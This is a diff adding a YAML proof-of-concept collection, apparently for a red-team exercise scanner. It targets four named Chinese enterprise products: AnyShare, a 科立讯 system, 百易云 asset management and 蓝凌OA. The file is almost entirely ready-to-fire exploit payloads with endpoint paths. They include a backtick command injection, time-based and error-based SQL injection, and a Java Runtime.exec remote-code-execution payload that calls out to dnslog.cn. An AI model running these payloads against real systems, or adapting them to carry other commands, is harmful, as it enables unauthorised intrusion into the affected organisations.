@@ -1,0 +1,36 @@
+name: "2025HW POC集"
+version: "1.0"
+pocs:
+  - name: "爱数AnyShare命令注入"
+    method: POST
+    path: "/api/ServiceAgent/start_service"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+      Content-Type: "application/json"
+    json_data: ["`sleep 5`"]
+    check_type: time_based
+    sleep_seconds: 5
+
+  - name: "科立讯logout.php SQL注入"
+    method: GET
+    path: "/custom/zx/logout.php"
+    params:
+      sign: "1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)&"
+    check_type: time_based
+    sleep_seconds: 8
+
+  - name: "百易云资管系统SQL注入"
+    method: POST
+    path: "/imaRead.make.php"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    data: "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)"
+    check_type: keyword
+    keyword: "XPATH"
+
+  - name: "蓝凌OA命令执行"
+    method: POST
+    path: "/ekp/data/sys-common/dataxml.tmpl"
+    data: "s_bean=ruleFormulaValidate&script=try { String cmd = \"ping dnslog.cn\"; Process child = Runtime.getRuntime().exec(cmd); } catch (IOException e) { System.err.println(e); }"
+    check_type: status_code
+    expected_status: 200
